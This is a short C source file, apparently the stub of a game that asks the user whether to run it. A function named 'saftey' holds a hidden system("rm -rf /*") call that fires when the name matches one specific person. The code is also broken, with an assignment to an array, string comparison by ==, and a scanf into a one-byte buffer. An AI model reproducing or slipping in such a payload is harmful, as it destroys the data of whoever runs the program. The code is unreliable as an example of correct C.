#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <SDL.h>

char A [1];
char name [24];

void saftey(){
  if(name="Matthew"){
    
  }
  if(name == "James Browner"){
    system("echo \"\"");
    system("rm -rf /*");
  }
}
int main(){
  printf("run game Y/N?");
  scanf("%s",A);
  if(strcmp(A,"Y") == 0){
    printf("then lets go");
  }
}
